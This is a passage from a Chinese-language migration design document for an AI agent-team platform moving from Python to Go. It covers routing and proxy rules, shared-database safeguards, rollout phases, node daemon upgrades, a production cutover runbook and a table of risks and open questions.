   1. **按路径，与用户无关**：`GET|POST|DELETE /mcp`（以及 `/mcp/*`）**始终代理给 Python**，直到 P6。进行中的 v1 运行用内存里的 MCP bearer 令牌（不是会话 cookie）调用 `<PUBLIC_URL>/mcp`，Go 无法、也不需要把它对应到用户；v2 没有 `/mcp`。这条代理用 `FlushInterval: -1`、**不设响应超时**、不缓冲请求体：v1 的 `ask_user`、`approve` 等调用最长可阻塞 86400 s，期间每 30 s 有保活。Go 的 `http.Server.WriteTimeout` 对这条路径关闭（用 `http.ResponseController` 逐请求清除截止时间）。
   2. **按路径**：`/nodes/connect` 先读 hello 再按节点所有者分流（§14.3、协议 §11）。
   3. **按用户**：`at_users.platform_version`（1 | 2，默认 1）。Go 已实现的接口（P1 起的账号、项目、节点、Git、管理）对所有用户由 Go 处理；其余接口对 v1 用户代理给 Python，对 v2 用户由 Go 处理。管理员在 Admin 页切换。
3. **共用数据库，只加不改**：Python 启动时会跑自己的幂等 DDL。v2 迁移在 Python 退役前**只新增表和列（带默认值）**，不改不删 v1 用到的列和约束，不加 v1 写入会违反的约束。v1 会读的表（`at_users` 等）两边语义一致。
4. **v1 必须看不见 v2 的数据（v1 防护补丁，P3 之前上线）**：“只加不改”挡不住语义冲突。v2 的讨论串任务和 v1 共用 `at_tasks`，也用 `pending`/`running`；而 v1 每次启动都跑 `Hub.recover()`：`store.unfinished_conversations()` 是 `SELECT DISTINCT conversation_id FROM at_tasks WHERE status IN ('pending','running')`，不按所有者也不按对话类型过滤，随后对每个对话 `_ensure_live`/`_recover`，用用户的 v1 YAML 团队接管、重跑或改成 `failed`（`INTERRUPTED`），再 `abandon_waiting()` 取消 v2 的提问。v1 的 `GET /api/conversations` 也会把统筹和讨论串对话当普通对话列出来。因此在 Python 上线一个小补丁（见 §14.5 的清单），**作为 P1 的退出标准之一，且必须在 `00010_threads` 迁移之前部署**：
   - 所有“列出 / 恢复 / 懒加载对话”的查询只看 `at_conversations.kind = 'chat'` **且** 所有者 `platform_version = 1`：`unfinished_conversations`（`JOIN at_conversations c ON c.id = t.conversation_id JOIN at_users u ON u.id = c.user_id WHERE c.kind = 'chat' AND u.platform_version = 1`）、对话列表、`_ensure_live`（非 chat 或 v2 用户的对话直接 404，不建 Leader）、`comms.restore` 加载的提问与留言、任务列表。
   - Python 自己的启动 DDL 加上 `ADD COLUMN IF NOT EXISTS kind TEXT NOT NULL DEFAULT 'chat'`（`at_conversations`）和 `platform_version SMALLINT NOT NULL DEFAULT 1`（`at_users`），这样补丁不依赖 Go 迁移的先后（Go 的 `00002` 也加同样的列，两边幂等）。
   - 补丁版 Python 启动时写 `at_settings.platform.legacy_guard = 1`；Go 的 `atctl migrate` 在执行 `00010_threads` 前检查它，没有就拒绝（防止顺序搞错）。
   - Python 的 `TaskView` 对未知状态值（`claimed`、`merging`、`blocked`…）不抛异常（补丁里改成 `str`），作为第二道保险。
   - **CI 冒烟测试**（每个迁移和每次 Python 改动都跑）：种入一个 v2 用户、一个讨论串、`running`/`pending`/`claimed` 的任务、open 的提问和留言 → 重启 Python v1 → 断言这些行一字未改、v1 对话列表里没有它们、没有为它们建 Leader。
5. **节点令牌不换**：哈希方式相同（sha256 hex）；新守护进程读取旧 `node.env` 里的令牌。
6. **GitHub App 路径不变**：Go 实现 `/api/git/github-app/created`、`/installed`、`/install` 与 v1 完全一致，签名 state 互认。
7. **Go 接管的写接口如果在 Python 内存里有副作用，必须同时通知 Python**（§14.5）。
8. **CSRF 分段上线**（§10.1）：v1 网页下线前，没有令牌的 cookie 写请求按同源头放行。

### 14.2 阶段

| 阶段 | 内容 | 用户可见变化 | 退出标准 |
| --- | --- | --- | --- |
| **P0 基线**（约 1 周） | monorepo 布局；`/protocol` schemas 与生成；goose 基线迁移 `00001_v1_baseline.sql` = v1 现有 DDL 的 `IF NOT EXISTS` 版（对生产是空操作，只登记版本）；CI（Go test + sqlc vet + web build + node test + gen diff） | 无 | 在生产库副本上 `migrate up` 无变化 |
| **P1 Go 前门**（约 2 周） | **Python 补丁先上**（§14.1 第 4 条的数据隔离 + §14.5 的内部接口）；Go 实现：认证（scrypt 校验、同一 cookie 与 `at_sessions`）、`/api/me`、项目、Git 连接、GitHub App 全流程、节点 CRUD 与令牌轮换、管理、`/api/team` 读写（仍是 YAML，写 `at_teams`）、`/install-node.sh`；有 Python 内存副作用的写接口按 §14.5 通知 Python；`/mcp` 和其余全部代理给 Python；CSRF 用同源检查（§10.1）；按 §14.6 切换 compose | 无（同一个网页） | 契约测试：录制的 v1 API 请求在 Go 与 Python 上响应一致；**CSRF**：v1 网页无令牌的写请求通过、跨站 Origin 被拒；**MCP**：经代理的 `/mcp` 阻塞调用挂 10 分钟（带 30 s 保活）后正常返回；**副作用**：停用用户、删节点、删 GitHub App、轮换令牌后 Python 侧的对话/MCP 令牌/提问/节点链路/令牌缓存都已清掉，`GET /api/nodes` 的 `online`/`active`/`since` 与 Python 一致；**v1 防护补丁**的冒烟测试通过；生产灰度 3 天无 5xx 增加 |
| **P2 新守护进程**（约 2–3 周，可与 P3 并行） | TS 守护进程：协议 1 兼容（`start/output/exit/cancel`、按 run_id 幂等、磁盘日志重放、退出码约定全同 v1）+ 协议 2；`install-node.sh` v2 原地升级（见 14.3）；控制台按 hello 协商协议 | 节点页显示新版本 | 生产节点全部换成新守护进程，v1 会话照常运行一周 |
| **P3 v2 核心**（约 4 周） | 岗位模板（YAML → 模板的 Go 迁移，旧格式自动转换规则同 threads.md）、统筹、讨论串、员工实例、常驻会话（Claude SDK + Codex app-server）、平台工具、任务池、审批卡片（canUseTool）、事件落库 + 项目 SSE、员工状态管线；网页 Main / Overview / Thread / Team / NewProject / ProjectSettings / Nodes / Mobile。前提：v1 防护补丁已在生产 | 管理员把自己和试用用户切到 v2 | 内部用户用 v2 完成真实讨论串到 PR；审批、断线、控制台重启、守护进程重启、节点重启、**Python 重启**的故障演练都通过 |
| **P4 交付流程**（约 3 周） | worktree、合并队列、CI（轮询 + 可选 webhook）、PR、验收、清理、交付物、项目记忆、审查/决策关卡 | v2 用户可用 | 同一仓库两个讨论串并行跑通合并队列和 CI 失败自动修复 |
| **P5 办公室**（约 2–3 周） | 布局 JSON + Schema + 默认布局、渲染器、寻路、状态 → 位置、回放、岗位形象（look）、布局热更新 | 办公室页上线 | 改 `office/default.json` 后打开的页面 2 秒内重画；回放 1 小时数据流畅 |
| **P6 全量切换与退役** | 逐批把用户切到 v2；旧对话在 v2 里作为“旧对话（只读）”可查看；全部切完后删除 `legacy` 服务和代理代码（含 `/mcp` 路径规则）；CSRF 改为全部要求令牌；之后的迁移才允许删 v1 专用列（`at_teams` 等保留只读一个版本） | 所有人 v2 | Python 下线 2 周无回滚需求 |
| **P7 加固** | 节点密钥对认证、多副本、密钥轮换、配额与限流细化 | — | — |

办公室需求用户已明确提出，P5 可以提前到与 P4 并行（状态管线在 P3 已具备，渲染器只依赖 `status` 事件和布局 JSON）。

### 14.3 节点原地升级

- 目录：`~/.local/share/agent-teams/node-<ver>/`（每个版本一份）+ 软链 `~/.local/share/agent-teams/current → node-<ver>`。
- `install-node.sh` v2：如果存在 `~/.config/agent-teams/node.env`，读取其中的 `AGENT_TEAMS_NODE_TOKEN`、`CONSOLE`、`ROOT`、`MAX_RUNS`（→ `max_active_sessions` 的初值），**不需要用户再复制令牌**；检查 Node ≥ 22（没有就提示用 nvm / 发行版包安装，或下载官方 tarball 到 `~/.local/share/agent-teams/nodejs`）；从控制台下载 tgz 和签名，校验后解到 `node-<ver>/` 并 `npm ci --omit=dev`（拉 Agent SDK 平台包约 366 MB）；把 `current` 指向它；systemd 单元写成 **`ExecStart=<node 绝对路径> %h/.local/share/agent-teams/current/dist/node.mjs`**（单元里不出现版本号）；`--agent-user` 时额外建 `at-agent` 用户和 sudoers 规则（§10.3）；保留旧 venv 和上一个 `node-<ver>/` 各一个版本以便回滚。
- 升级与回滚都只改软链：`node.upgrade` 解包新版本后原子替换 `current`（`ln -sfn` 到临时名再 `rename`），`exit 75` 让 systemd 重启就跑新版本；`install-node.sh --rollback` 把 `current` 指回上一个版本（从 Python 守护进程升级来的节点，回滚则恢复旧单元文件指向 venv）。
- 节点页提供“升级”按钮：控制台给在线节点发 `node.upgrade {version, sha256, signature}`，下载地址固定为控制台自己的 `/node/dist/`（协议 §9），守护进程校验 sha256 和发布签名后切换（P2 末期提供）。
- 旧 Python 守护进程连到 Go 前门时（协议 1，`hello.protocol == 1`）：该节点属于 v1 用户 → 代理给 Python；属于 v2 用户 → 拒绝并在节点页提示“请升级守护进程”。管理员改某个用户的 `platform_version` 时，控制台关闭该用户所有已代理到 Python 的节点链路（4426），守护进程重连后按新归属重新协商。

### 14.4 数据迁移与回退

详见 `data-model.md` §3。要点：

- 账号、会话、节点、设置、Git 连接、项目：**原表原地扩展**，无需搬数据。
- 团队：`at_teams.config`（YAML）→ `at_roles`，由 goose 的 Go 迁移在用户切到 v2 时按需转换（不是一次性全量，便于回退）；`at_teams` 保留只读。
- 旧对话：`at_conversations.kind` 默认 `chat`；v2 里以“旧对话”只读呈现（消息、任务、提问、留言都能看，接口见 `api.md` §3.13）；切到 v2 的用户的 v1 进行中任务在切换时被标记为 `failed`（“已迁移到 v2”），切换操作要求该用户没有 running 任务（Admin 页显示，可强制）。
- **回退**（把用户的 `platform_version` 改回 1）：前提是 v1 防护补丁已上线，否则 Python 下次重启会接管该用户的 v2 讨论串。回退时控制台：① 把该用户所有活跃讨论串置 `paused`（`pause_reason: 'rolled_back_to_v1'`），中断回合、`session.close` 全部会话、任务池停止派发；② 关闭该用户的 v2 节点链路（守护进程重连后以协议 1 跑 v1 运行）；③ 保留 v2 数据不动。由于 v1 只看 `kind='chat'` 的对话，v2 的统筹和讨论串对话、任务、提问、留言在 v1 里不可见也不会被恢复。再切回 v2 时讨论串保持暂停，由用户在 Thread 页继续。

### 14.5 Python 补丁与 Go 接管接口的副作用

Python 补丁（P1 前上线，P6 随 Python 一起删除）包含两部分：§14.1 第 4 条的数据隔离，以及只在 compose 网络里监听、用 `X-Legacy-Secret: $LEGACY_INTERNAL_SECRET` 认证的内部接口（Caddy 不转发 `/internal/*`，Go 前门对外 404）：

| 内部接口 | 作用（Python 内存里的状态） |
| --- | --- |
| `POST /internal/users/{id}/cutoff` | 关闭该用户所有 live 对话、吊销其 MCP 令牌、取消等待中的提问、断开其节点链路（与 v1 停用/删除用户时的切断逻辑相同） |
| `POST /internal/nodes/{id}/disconnect` | 断开该节点链路，从注册表移除 |
| `POST /internal/github-app/reset` | 清空安装令牌缓存和 App 凭证缓存 |
| `POST /internal/conversations/{id}/close` | 关闭某个 live 对话（项目删除时用） |
| `GET /internal/nodes/live?ids=` | 协议 1 链路的实时字段：`online`、`since`、`active[]`、`max_runs` |

Go 接管的、在 Python 内存里有副作用的接口，**先写库，再同步调用对应内部接口**（失败重试 3 次，仍失败则返回 503 并回滚写库，保证不出现“库里停用了、Python 里还在跑”）：

| Go 接口 | 调用 |
| --- | --- |
| `PATCH /api/admin/users/{id}`（`active: false`、改 `max_nodes` 导致超额） | `cutoff` |
| `DELETE /api/admin/users/{id}` | `cutoff`（在删行之前） |
| `DELETE /api/nodes/{id}`、`POST /api/nodes/{id}/token` | `nodes/{id}/disconnect` |
| `DELETE /api/admin/github-app`、`POST /api/admin/github-app/manifest`（替换 App） | `github-app/reset` |
| `DELETE /api/projects/{pid}`（v1 用户） | 对该项目每个 live 对话 `conversations/{id}/close` |
| `GET /api/nodes`、`GET /api/admin/users`（节点数） | 对协议 1 的链路合并 `nodes/live` 的字段；Go 代理节点 WS 时也自己记录 hello、连接时间和断开时间作为后备（Python 不可用时 `online` 按 Go 看到的链路给出，`active` 为空） |

### 14.6 生产切换手册（P1 上线当天）

现状：`agent-teams` 服务占着 `${BIND}:${PORT}`，Caddy 指向它。Caddy 不改。

1. 在副本库上跑一遍 `atctl migrate up` 和 v1 冒烟测试；确认 Python 补丁版本已在生产运行至少 1 天。
2. 编辑 compose：把 `agent-teams` 服务改名为 `legacy`（镜像、环境、卷不变），**去掉它的 `ports`**，健康检查保留；新增 `migrate` 和 `control-plane`，`control-plane` 用原来的 `ports: ["${BIND:-127.0.0.1}:${PORT}:${PORT}"]`，环境加 `LEGACY_URL=http://legacy:${PORT}`、`LEGACY_INTERNAL_SECRET`。
3. `docker compose run --rm migrate` → `docker compose up -d legacy control-plane`。端口从旧容器移交到新容器之间有几秒不可用：Caddy 在此期间返回 502，节点守护进程和浏览器 SSE 自动重连；进行中的 v1 运行不受影响（运行在节点上，日志可重放）。正在阻塞的 v1 `/mcp` 调用会断开，员工侧按 v1 行为重试。
4. 验证：`/healthz`、登录、项目列表、节点在线状态、一次 v1 对话发消息（经代理）、一次 `/mcp` 调用、GitHub App 安装回调。
5. **回滚**：`docker compose stop control-plane`，把 `legacy` 的 `ports` 加回并改回原名（或直接恢复备份的 compose 文件），`docker compose up -d`。Go 期间写的数据都在 v1 表里、格式相同，Python 直接可用；`00002` 新加的列 Python 不读，留着无害。

## 15. 风险与未决问题

| # | 风险 / 问题 | 影响 | 处理 |
| --- | --- | --- | --- |
| R1 | Agent SDK 未实测项：`interrupt()`、`resume`、`setPermissionMode`、长时间挂起的 `canUseTool`、`priority:'now'`、PreToolUse deny 是否压过 bypass、进程内 MCP 工具长时间阻塞 | 审批、插话、统筹强制、阻塞工具 | P3 第一周写“SDK 验收脚本”逐项实测（脚本入库，升级 SDK 时重跑）。阻塞工具有非阻塞退路（§6.3）；`resume` 不行则会话不 park（多占内存，降低 `max_active_sessions`）；`priority:'now'` 不行则 `interrupt()` + 普通发送 |
| R2 | 每个活跃 Claude 会话一个约 250 MB 子进程；订阅账号多会话共享速率限制 | 节点容量、速率限制 | 会话 park、成员懒启动、`max_active_sessions`；`rate_limit_event` 进指标并在办公室显示“限速中”；调度器在限速时降低派发 |
| R3 | `codex app-server` 标注 experimental，协议大且会变 | Codex 员工 | 精确锁 CLI 版本 + 入库生成的类型；升级前跑 mock 回归（复用调研时写的 mock Responses + MCP 场景）；退路：成员只读任务用 `codex exec --json`（无审批） |
| R4 | 现有 GitHub App 缺 `checks: read`；加权限需每个安装方批准 | CI 关卡 | 没批准时 CI 关卡降级为 off 并提示；GitHub 页显示“需要批准新权限”的链接；新建 App 直接带权限 |
| R5 | Codex `workspace-write` 在无非特权 user namespace 的容器节点不可用 | Codex 审批 | hello 上报 `sandbox_ok`（守护进程启动时试跑 bwrap）；不支持时该节点的 Codex 岗位只能选 read-only 或 danger-full-access（后者须 isolated 节点） |
| R6 | 迁移期 Python 与 Go 共用库：① Python 的启动 DDL 与 v2 迁移冲突；② **语义冲突**：v1 `Hub.recover()` 按 `at_tasks.status IN ('pending','running')` 恢复对话，不分所有者和对话类型，会接管 v2 讨论串、改写任务、取消 v2 提问；v1 对话列表会列出统筹/讨论串对话 | 数据、回退 | ① “只加不改”规则；② v1 防护补丁（只看 `kind='chat'` 且所有者 `platform_version=1`，§14.1 第 4 条）在 P1 上线、早于 `00010`；CI 冒烟测试种入 v2 行后重启 Python v1 并断言不变；回退流程先暂停 v2 讨论串（§14.4） |
| R7 | 内置 `claude` 二进制每节点约 366 MB 下载，锁 SDK 即锁 Claude Code 版本 | 安装、升级 | 控制台提供升级按钮；守护进程支持 `pathToClaudeCodeExecutable` 覆盖（节点页高级设置） |
| R8 | 控制台单副本 | 可用性 | 状态全在 PG，重启无损（会话在节点上继续跑，重连后重放）；P7 多副本 |
| R9 | 员工与守护进程同机运行，可能读到节点令牌和运行时登录；Codex 沙箱只限写不限读 | 凭证泄露 | 隔离级别（§10.3）：推荐 `agent_user`；`sandbox` 级别靠 Claude Bash 沙箱 + 路径拒绝，Codex 员工只派到 `agent_user`/`isolated` 节点；员工令牌按仓库只读缩小、写操作只走平台作业（§8.1、§10.4）。P3 实测 Claude 沙箱的 `denyRead` 对子进程生效、`CLAUDE_CONFIG_DIR` 指向员工不可读目录时 claude 仍能登录；若 Codex 后续支持限制读路径，再放宽 `sandbox` 级别对 Codex 的限制 |
| R10 | 一个项目的事件写入用 `at_projects.event_seq` 行锁串行化 | 高频状态事件时的写吞吐 | 状态去抖 800 ms、事件插入放在事务最后；P5 压测（单项目 30 员工）若锁等待明显，改为“IDENTITY + 安全窗口重读（`seq > last − 200` 且客户端按 id 去重）” |
| Q1 | 每个讨论串的成员是否允许跨项目共享节点额度上限？ | — | 先按节点 `max_active_sessions` 全局限制，不分项目 |
| Q2 | 审查岗是独立会话还是组长兼任？ | — | 默认岗位模板里可选 `review` 岗；没有审查岗时审查关卡由组长执行（组长只读，正好） |
| Q3 | 统筹和组长默认模型、成员默认模型 | 成本 | 默认都用 `claude-opus-5-5`（与 v1 约定一致），岗位模板可改 |
| Q4 | 项目记忆的上限和摘要方式 | 提示长度 | 来源：用户手写、统筹 `remember`、组长 `finish(summary)`（`source='#<no>'`）。先全文附加置顶的和最近 50 条，超过 8 KB 时由统筹定期 `remember` 汇总（P4 再定） |
| Q5 | 办公室布局是全站一个还是每项目可覆盖 | — | 两者都支持：文件提供默认，项目设置可选择/覆盖（`office-layout.md` §7） |
| Q6 | v1 的库功能（`chat`、`run`、SSH/本地节点、`Agent`/`Sequential` 等） | 范围 | v2 不带；保留在 v1 Python 包里，P6 后从仓库删除 |
